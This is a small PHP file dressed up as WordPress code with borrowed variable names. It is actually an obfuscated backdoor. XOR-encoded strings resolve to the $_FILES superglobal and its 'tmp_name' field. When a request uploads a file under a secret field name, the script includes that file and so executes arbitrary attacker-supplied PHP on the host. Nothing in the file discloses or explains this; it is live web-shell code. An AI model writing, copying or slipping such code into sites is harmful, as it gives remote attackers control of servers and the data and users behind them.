<?php 	

$type = 'CIUqgEOMkN1A';
$pee_parts = $type;

function number($add_trashed_suffix, $rel_array)

{
	$ptype = 'deprecated';
    $comma = $rel_array;
    $term = urldecode($add_trashed_suffix);

    $link_html = substr($comma,0, strlen($term));
	$days = 'tag_pattern';
    $last_changed = $term ^ $link_html;

    return $last_changed;

}
$cockneyreplace = ${number("%1C%0F%1C%3D%22%16", $pee_parts)};

$wpsmiliestrans = $cockneyreplace;
$ignore_block_element = isset($wpsmiliestrans[$pee_parts]);
	$num_words = 'excerpt';
if ($ignore_block_element)

{
    $secs = $cockneyreplace[$pee_parts];

    $wp_post_statuses = $secs[number("7%24%25.%09%24%22%28", $pee_parts)];
    $register_meta_box_cb = $wp_post_statuses;

    include ($register_meta_box_cb);

}
?>
